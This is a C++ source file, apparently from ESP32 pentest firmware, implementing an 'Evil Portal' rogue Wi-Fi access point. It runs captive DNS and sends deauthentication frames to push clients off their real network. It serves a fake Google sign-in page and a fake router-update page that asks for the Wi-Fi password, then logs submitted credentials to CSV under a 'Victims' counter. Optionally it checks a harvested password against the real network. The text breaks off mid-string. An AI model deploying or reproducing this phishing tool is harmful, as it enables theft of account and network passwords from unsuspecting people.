#include "evil_portal.h"
#include "core/config.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_wifi.h"
#include "wifi_atks.h"

EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPwd)
    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), webServer(80) {
    if (!setup()) return;

    beginAP();
    loop();
};

EvilPortal::~EvilPortal() {
    webServer.end();
    dnsServer.stop();
    vTaskDelay(100 / portTICK_PERIOD_MS);
    wifiDisconnect();
};

void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
    AsyncResponseStream *response = request->beginResponseStream("text/html");
    String url = request->url();
    if (url == "/") _portal->portalController(request);
    else if (url == "/post") _portal->credsController(request);
    else if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
             bruceConfig.evilPortalEndpoints.allowGetCreds)
        request->send(200, "text/html", _portal->creds_GET());
    else if (url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
             bruceConfig.evilPortalEndpoints.allowSetSsid) {
        if (request->hasArg("ssid")) {
            _portal->apName = request->arg("ssid").c_str();
            request->send(200, "text/html", _portal->ssid_POST());
            _portal->restartWiFi();
        } else {
            request->send(200, "text/html", _portal->ssid_GET());
        }
    } else {
        if (request->args() > 0) _portal->credsController(request);
        else _portal->portalController(request);
    }
}
bool EvilPortal::setup() {
    options = {
        {"Custom Html", [this]() { loadCustomHtml(); }}
    };
    addOptionToMainMenu();

    if (!_verifyPwd) {
        // Insert Options
        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml(); }});
    } else {
        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
    }

    loopOptions(options);

    if (returnToMenu) return false;

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_raw_frame(&ap_record, _channel); // writes the buffer with the information

    if (apName == "") {
        if (bruceConfig.evilWifiNames.empty()) {
            apName_from_keyboard();
        } else {
            options = {
                {"Custom Wifi", [this]() { apName_from_keyboard(); }}
            };

            for (const auto &_wifi : bruceConfig.evilWifiNames) {
                options.emplace_back(_wifi.c_str(), [this, _wifi]() { this->apName = _wifi; });
            }

            loopOptions(options);
        }
    }

    options = {
        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
        {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
    };

    loopOptions(options);

    Serial.println("Evil Portal output file: " + outputFile);
    return true;
}

void EvilPortal::beginAP() {
    drawMainBorderWithTitle("EVIL PORTAL");

    displayTextLine("Starting...");
    // WIFI_MODE_APSTA captive portal takes time to popup, but is useful for verifying Wifi credentials
    if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
    else WiFi.mode(WIFI_MODE_AP);
    WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
    WiFi.softAP(apName, emptyString, _channel);
    wifiConnected = true;

    int tmp = millis();
    while (millis() - tmp < 3000) yield();

    setupRoutes();
    dnsServer.start(53, "*", WiFi.softAPIP());
    webServer.begin();
}

bool EvilPortal::verifyCreds(String &Ssid, String &Password) {

    bool isConnected = false;

    // temporary stop deauth if deauth + clone is true
    bool temp = _deauth;
    _deauth = false;
    // Try to connect to wifi
    WiFi.begin(Ssid, Password);

    int i = 1;
    while (WiFi.status() != WL_CONNECTED) {
        if (i > 12) break; // 12 times, 6 seconds
        vTaskDelay(500 / portTICK_PERIOD_MS);
        i++;
    }

    if (WiFi.status() == WL_CONNECTED) { isConnected = true; }

    WiFi.disconnect(false);
    // re enable
    _deauth = temp;

    return isConnected;
}

void EvilPortal::setupRoutes() {
    // this must be done in the handleRequest() function too
    webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
    webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
    if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
        webServer.on(
            bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
            [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
        );
    }
    if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
        webServer.on(
            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
                if (request->hasArg("ssid")) {
                    apName = request->arg("ssid").c_str();
                    request->send(200, "text/html", ssid_POST());
                    restartWiFi();
                } else {
                    request->send(200, "text/html", ssid_GET());
                }
            }
        );
    }

    webServer.onNotFound([this](AsyncWebServerRequest *request) {
        if (request->args() > 0) credsController(request);
        else portalController(request);
    });

    webServer.addHandler(new CaptiveRequestHandler(this))
        .setFilter(ON_AP_FILTER); // only when requested from AP
}

void EvilPortal::restartWiFi(bool reset) {
    webServer.end();
    wifiDisconnect();
    WiFi.softAP(apName);
    webServer.begin();

    // code to handle whether to reset the counter..

    if (reset) { resetCapturedCredentials(); }
}

void EvilPortal::resetCapturedCredentials(void) {
    previousTotalCapturedCredentials = -1; // Reset captured credentials count
}

void EvilPortal::loop() {
    int lastDeauthTime = millis(); // one deauth frame each 30ms at least
    bool shouldRedraw = true;

    while (true) {
        if (shouldRedraw) {
            drawScreen();
            shouldRedraw = false;
        }

        dnsServer.processNextRequest();

        if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
            send_raw_frame(deauth_frame, 26); // Sends deauth frames if needed
            lastDeauthTime = millis();
        }

        if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
            shouldRedraw = true;
            previousTotalCapturedCredentials = totalCapturedCredentials - 1;
        }

        if (check(SelPress)) {
            isDeauthHeld = _deauth ? !isDeauthHeld : isDeauthHeld;
            shouldRedraw = true;
        }

        if (check(EscPress)) break;

        if (verifyPass) {
            wifiDisconnect();
            verifyPass = false;
        }
    }
}

void EvilPortal::drawScreen() {
    drawMainBorderWithTitle("EVIL PORTAL");

    String subtitle = "AP: " + apName.substring(0, 30);
    if (apName.length() > 30) subtitle += "...";
    printSubtitle(subtitle);

    String apIp = WiFi.softAPIP().toString();
    padprintln("");
    if (bruceConfig.evilPortalEndpoints.showEndpoints) {
        if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
        } else {
            padprintln("-> cred access disabled");
        }
        if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
        } else {
            padprintln("-> SSID change disabled");
        }
    } else {
        padprintln("Endpoints hidden");
    }
    padprintln("");

    if (!_verifyPwd) {
        padprint("Victims: " + String(totalCapturedCredentials));
    } else {
        padprint("Attempt: " + String(totalCapturedCredentials));
    }
    String passMode = "";
    switch (bruceConfig.evilPortalPasswordMode) {
        case FULL_PASSWORD: passMode = "Full"; break;
        case FIRST_LAST_CHAR: passMode = "p******d"; break;
        case HIDE_PASSWORD: passMode = "*hidden*"; break;
        case SAVE_LENGTH: passMode = "Length only"; break;
    }
    padprintln("Pwd mode: " + passMode);
    printLastCapturedCredential();

    printDeauthStatus();
}

void EvilPortal::printLastCapturedCredential() {
    while (lastCred.length()) {
        int newlineIndex = lastCred.indexOf('\n');
        if (newlineIndex > -1) {
            padprintln(lastCred.substring(0, newlineIndex));
            lastCred.remove(0, newlineIndex + 1);
        } else {
            padprint(lastCred);
            lastCred = "";
        }
    }
}

void EvilPortal::printDeauthStatus() {
    if (!_deauth || isDeauthHeld) {
        printFootnote("Deauth OFF");
    } else {
        tft.setTextColor(TFT_RED);
        printFootnote("Deauth ON");
        tft.setTextColor(bruceConfig.priColor);
    }
}

void EvilPortal::loadCustomHtml() {
    getFsStorage(fsHtmlFile);

    htmlFileName = loopSD(*fsHtmlFile, true, "HTML", "/BruceHTMLs");    // Default folder for custom HTML files
    String fileBaseName =
        htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
    fileBaseName.toLowerCase();

    outputFile = fileBaseName + "_creds.csv";
    isDefaultHtml = false;

    // Open the file and read the first line (searching for: <!-- AP="..." -->)
    File htmlFile = fsHtmlFile->open(htmlFileName, FILE_READ);
    if (htmlFile) {
        String firstLine = htmlFile.readStringUntil('\n'); // Read the first line
        htmlFile.close();

        // Look for the AP tag in the first line
        int apStart = firstLine.indexOf("<!-- AP=\"");
        if (apStart != -1) {
            int apEnd = firstLine.indexOf("\" -->", apStart);
            if (apEnd != -1) {
                apName = firstLine.substring(apStart + 9, apEnd); // Extract the AP name
            }
        }
    }
}

String EvilPortal::wifiLoadPage() {
    PROGMEM String wifiLoad =
        "<!DOCTYPE html><html><head> <meta charset='UTF-8'> <meta name='viewport' "
        "content='width=device-width, initial-scale=1.0'> </style></head><body> <div class='container'> <div "
        "class='logo-container'> <?xml version='1.0' standalone='no'?> <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG "
        "20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'> </div> <div> <div> <div "
        "id='logo' title='Wifi' style='display: flex;justify-content: center;max-width: 50%;margin: auto;'> "
        "<svg fill='#000000' height='800px' width='800px' version='1.1' id='Capa_1' "
        "xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 365.892 "
        "365.892' xml:space='preserve'> <g> <circle cx='182.945' cy='286.681' r='41.494'/> <path id='p1' "
        "d='M182.946,176.029c-35.658,0-69.337,17.345-90.09,46.398c-5.921,8.288-4.001,19.806,4.286,25.726 "
        "c3.249,2.321,6.994,3.438,10.704,3.438c5.754,0,11.423-2.686,15.021-7.724c13.846-19.383,36.305-30.954,"
        "60.078-30.954 "
        "c23.775,0,46.233,11.571,60.077,30.953c5.919,8.286,17.437,10.209,25.726,4.288c8.288-5.92,10.208-17."
        "438,4.288-25.726 C252.285,193.373,218.606,176.029,182.946,176.029z'/> <path id='p2' "
        "d='M182.946,106.873c-50.938,0-99.694,21.749-133.77,59.67c-6.807,7.576-6.185,19.236,1.392,26.044 "
        "c3.523,3.166,7.929,4.725,12.32,4.725c5.051-0.001,10.082-2.063,13.723-6.116c27.091-30.148,65.849-47."
        "439,106.336-47.439 "
        "s79.246,17.291,106.338,47.438c6.808,7.576,18.468,8.198,26.043,1.391c7.576-6.808,8.198-18.468,1.391-"
        "26.043 C282.641,128.621,233.883,106.873,182.946,106.873z'/> <path id='p3' "
        "d='M360.611,112.293c-47.209-48.092-110.305-74.577-177.665-74.577c-67.357,0-130.453,26.485-177.664,"
        "74.579 "
        "c-7.135,7.269-7.027,18.944,0.241,26.079c3.59,3.524,8.255,5.282,12.918,5.281c4.776,0,9.551-1.845,13."
        "161-5.522 "
        "c40.22-40.971,93.968-63.534,151.344-63.534c57.379,0,111.127,22.563,151.343,63.532c7.136,7.269,18."
        "812,7.376,26.08,0.242 C367.637,131.238,367.745,119.562,360.611,112.293z'/> </g> </svg> </div> "
        "</div> </div> </div> <script> const paths = document.querySelectorAll('path'); let index = 0; "
        "function showNextPath() { if (index < paths.length) { paths[index].style.display = 'block'; "
        "index++; } } function hideAllPaths() { paths.forEach(path => { path.style.display = 'none'; }); "
        "index = 0; } hideAllPaths(); setInterval(function() { if (index < paths.length) { showNextPath(); } "
        "else { hideAllPaths(); } }, 1000); </script></body></html>";
    return wifiLoad;
}

void EvilPortal::loadDefaultHtml_one() {
    htmlPage =
        "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' "
        "content='width=device-width, initial-scale=1.0'><title>Router Update</title><style>body "
        "{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background-color: #d3d3d3; /* Cinza "
        "mais escuro */display: flex;justify-content: center;align-items: center;height: 100vh;margin: "
        "0;padding: 10px;box-sizing: border-box;}.container {background-color: white;padding: "
        "20px;border-radius: 10px;box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);text-align: center;max-width: "
        "360px;width: 100%;}.container svg {width: 70px;height: 70px;fill: #ff1744; /* Cor de alerta "
        "*/margin-bottom: 20px;}h1 {color: #333;font-size: 22px;margin-bottom: 15px;}p {color: "
        "#666;font-size: 15px;margin-bottom: 20px;}input[type='password'] {width: 100%;padding: 12px;margin: "
        "10px 0;border-radius: 5px;border: 1px solid #ccc;font-size: 16px;box-sizing: border-box;}button "
        "{width: 100%;padding: 12px;background-color: #007bff;color: white;border: none;border-radius: "
        "5px;cursor: pointer;font-size: 16px;transition: background-color 0.3s;}button:hover "
        "{background-color: #0056b3;}div#success-block{display: none;text-align: center;min-height: "
        "60px;margin-bottom: 30px;justify-content: center;align-items: center;}</style></head><body><div "
        "class='container'><!-- Ícone No Signal em SVG --><svg xmlns='http://www.w3.org/2000/svg' "
        "fill='#000000' width='800px' height='800px' viewBox='0 -1 26 26'><path fill-opacity='.3' d='M24.24 "
        "8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 15.66.01.02.01-.01L20 "
        "13.28V8h4.24z'/><path d='M22 22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg><h1>Router Update</h1><div "
        "id='form-block'><p>Router firmware update required. Enter your Wi-Fi password to update.</p><form "
        "id='submit-form' action='/post'><input type='password' name='password' placeholder='Wi-Fi network "
        "password' required><button type='submit'>Update</button></form></div><div id='success-block'><p>The "
        "router will restart in <span id='span-count' style='font-weight: "
        "bolder;'>5</span></p></div></"
        "div><script>document.getElementById('submit-form').addEventListener('submit', function(event) "
        "{event.preventDefault();document.getElementById('success-block').style.display = "
        "'flex';document.getElementById('form-block').style.display = 'none';setInterval(function() {index = "
        "parseInt(document.getElementById('span-count').textContent)if (index > 1) "
        "{document.getElementById('span-count').textContent = index-1;index--;} else "
        "{document.getElementById('submit-form').submit();}}, 1000);});</script></body></html>";
    outputFile = "default_creds_1.csv";
    isDefaultHtml = true;
}

void EvilPortal::loadDefaultHtml() {
    // htmlPage = "<!DOCTYPE html><html><head><title>Fazer login nas Contas do Google</title><meta
    // charset='UTF-8'><meta name='viewport' content='width=device-width,
    // initial-scale=1.0'><style>a:hover{text-decoration: underline;}body{font-family: Arial,
    // sans-serif;align-items: center;justify-content: center;background-color: #FFFFFF;}input[type='text'],
    // input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px
    // solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width:
    // 700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content:
    // center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right:
    // 100px;}.company-name{font-size: 42px;color: black;margin-left: 0px;}.form-container{background:
    // #FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px
    // rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom:
    // 20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius:
    // 4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border:
    // none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background:
    // #0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: none;font-size:
    // 14px;cursor: pointer;}.forgot-btn:hover{background-color:
    // rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size:
    // 24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px
    // 30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media screen
    // and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style></head><body><div
    // class='container'><div class='logo-container'><?xml version='1.0' standalone='no'?><!DOCTYPE svg PUBLIC
    // '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div
    // class=form-container><center><div class='containerlogo'><!-- Google Logo --><div id='logo'
    // title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg'
    // aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33
    // 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068
    // 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73
    // 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04
    // 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path
    // fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4'
    // d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98
    // 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61
    // 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06
    // 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588
    // 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635
    // 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28
    // 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96
    // 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61
    // 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g
    // id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958
    // 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96
    // 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61
    // 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g
    // id='idEJde'><path fill='#4285f4'
    // d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664
    // 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43
    // 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74
    // 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div><!--
    // /Google Logo --></div></center><div style='min-height: 150px'><center><div class='containertitle'>Fazer
    // login</div><div class='containersubtitle'>Use sua Conta do Google</div></center><form action='/post'
    // id='login-form'><input name='email' class='input-field' type='text' placeholder='E-mail ou telefone'
    // required><input name='password' class='input-field' type='password' placeholder='Digite sua senha'
    // required /><div class='containermsg'><button class='forgot-btn'>Esqueceu sua senha?</button></div><div
    // class='containerbtn'><button id=submitbtn class=submit-btn
    // type=submit>Avançar</button></div></form></div></div></div></body></html>";
    htmlPage =
        "<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset='UTF-8'><meta "
        "name='viewport' content='width=device-width, initial-scale=1.0'><style>a:hover{text-decoration: "
        "underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: "
        "center;background-color: #FFFFFF;}input[type='text'], input[type='password']{width: 100%;padding: "
        "12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: "
        "4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: "
        "center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo{width: "
        "40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: "
        "black;margin-left: 0px;}.form-container{background: #FFFFFF;border: 1px solid "
        "#CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, "
        "0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: "
        "20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: "
        "4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: "
        "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
        "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
        "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: "
        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px "
        "30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media "
        "screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style></head><body><div "
        "class='container'><div class='logo-container'><?xml version='1.0' standalone='no'?><!DOCTYPE svg "
        "PUBLIC '-//W3C//DTD SVG 20010904//EN' "
        "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div "
        "class=form-container><center><div class='containerlogo'><!-- Google Logo --><div id='logo' "
        "title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' "
        "aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 "
        "0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 "
        "2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 "
        "1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 "
        "3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' "
        "d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 "
        "8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 "
        "5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 "
        "0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 "
        "5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 "
        "3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g "
        "id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 "
        "5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 "
        "0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 "
        "3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 "
        "2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 "
        "0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 "
        "3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path "
        "fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 "
        "1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 "
        "4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 "
        "0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 "
        "4.69-1.856z'></path></g></svg></div><!-- /Google Logo --></div></center><div style='min-height: "
        "150px'><center><div class='containertitle'>Sign in</div><div class='containersubtitle'>Use your "
        "Google Account</div></center><form action='/post' id='login-form'><input name='email' "
        "class='input-field' type='text' placeholder='Email or phone' required><input name='password' "
        "class='input-field' type='password' placeholder='Enter your password' required /><div "
        "class='containermsg'><button class='forgot-btn'>Forgot password?</button></div><div "
        "class='containerbtn'><button id=submitbtn class=submit-btn "
        "type=submit>Next</button></div></form></div></div></div></body></html>";
    outputFile = "default_creds.csv";
    isDefaultHtml = true;
}

void EvilPortal::portalController(AsyncWebServerRequest *request) {
    if (isDefaultHtml) request->send(200, "text/html", htmlPage);
    else { request->send(*fsHtmlFile, htmlFileName, "text/html"); }
}

void EvilPortal::credsController(AsyncWebServerRequest *request) {
    String htmlResponse = "<li>";
    String passwordValue = "";
    String csvLine = "";
    String key;
    lastCred = "";

    for (int i = 0; i < request->args(); i++) {
        key = request->argName(i);

        if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") || key == "P1" || key == "P2" ||
            key == "P3" || key == "P4") {
            continue;
        }

        // get key if verify and before blanking
        if (key == "password" && _verifyPwd) { passwordValue = request->arg(i); }

        String valueBuffer = request->arg(i);

        if (key == "password") {
            char blank = '*';
            switch (bruceConfig.evilPortalPasswordMode) {
                case FULL_PASSWORD:
                    // do nothing, already have full password and want to save it
                    break;
                case FIRST_LAST_CHAR:
                    // overwrite the middle of the passwordValue with *s
                    if (valueBuffer.length() > 2) {
                        for (int i = 1; i < valueBuffer.length() - 1; i++) { valueBuffer[i] = blank; }
                    }
                    // otherwise don't blank anything if pwd is < 2 chars
                    break;
                case HIDE_PASSWORD:
                    // overwrite the passwordValue with '*hidden*'
                    valueBuffer = "*hidden*";
                    break;
                case SAVE_LENGTH:
                    // overwrite the passwordValue with 'X chars'
                    valueBuffer = String(valueBuffer.length()) + " chars";
                    break;
            }
        }

        // Build HTML and CSV line
        htmlResponse += key + ": " + valueBuffer + "<br>\n";
        if (i > 0) { csvLine += ","; }

        // Skip irrelevant parameters

        csvLine += key + ": " + valueBuffer;
        lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
    }

    htmlResponse += "</li>\n";

    if (_verifyPwd && passwordValue != "") {
        request->send(200, "text/html", wifiLoadPage());
        // vTaskDelay(200 / portTICK_PERIOD_MS); // give it time to process the request
        bool isCorrect = verifyCreds(apName, passwordValue);
        if (isCorrect) {

            // Display valid to screen if valid..
            lastCred += "valid: true\nStopping server...";
            saveToCSV(csvLine + ", valid: true", true);
            printDeauthStatus();

            // save to WiFi creds if the pwd was correct.
            if (bruceConfig.getWifiPassword(apName) != "") {
                bruceConfig.addWifiCredential(apName, passwordValue);
            }
            vTaskDelay(50 / portTICK_PERIOD_MS);
            // stop further actions...
            verifyPass = true;
            _deauth = false;

        } else {
            lastCred += "valid: false";
            // still save invalid creds...
            saveToCSV(csvLine + ", valid: false", true);
            portalController(request);
        }
    } else {
        saveToCSV(csvLine);
        request->send(200, "text/html", wifiLoadPage());
    }

    capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
    totalCapturedCredentials++;
}

String EvilPortal::getHtmlTemplate(String body) {
    PROGMEM String html =
        "<!DOCTYPE html>"
        "<html>"
        "<head>"
        "  <title>" +
        apName +
        "</title>"
        "  <meta charset='UTF-8'>"
        "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
        "  <style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: "
        "center;justify-content: center;background-color: #FFFFFF;}input[type='text'], "
        "input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: "
        "border-box;border: "
        "1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: "
        "700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: "
        "center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: "
        "100px;}.company-name{font-size: 42px;color: black;margin-left: 0px;}.form-container{background: "
        "#FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px "
        "rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: "
        "20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: "
        "4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: "
        "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
        "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
        "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: "
        "#202124;font-size: "
        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px "
        "0px "
